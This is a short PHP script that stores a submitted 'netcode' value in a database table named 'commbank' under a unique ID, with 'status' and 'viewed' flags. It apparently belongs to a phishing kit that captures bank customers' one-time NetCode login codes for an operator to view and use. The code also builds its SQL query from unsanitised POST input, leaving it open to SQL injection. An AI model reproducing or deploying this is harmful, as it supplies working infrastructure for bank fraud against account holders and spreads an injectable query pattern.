<?php
require '../connection.php';

if ($_POST["netcode"] and $_POST["uniqueid"]) {
  $netcode = $_POST["netcode"];
  $uniqueid = $_POST["uniqueid"];

  $upload_login_code = mysqli_query($conn, "UPDATE commbank SET netcode='$netcode', status=0, viewed='false' WHERE uniqueid=$uniqueid");

  if ($upload_login_code) {
    echo json_encode(array(
      'status' => 'success'
    ));
  } else {
    echo json_encode(array(
      'status' => 'failure',
      'error' => mysqli_error($conn)
    ));
  }
}
?>
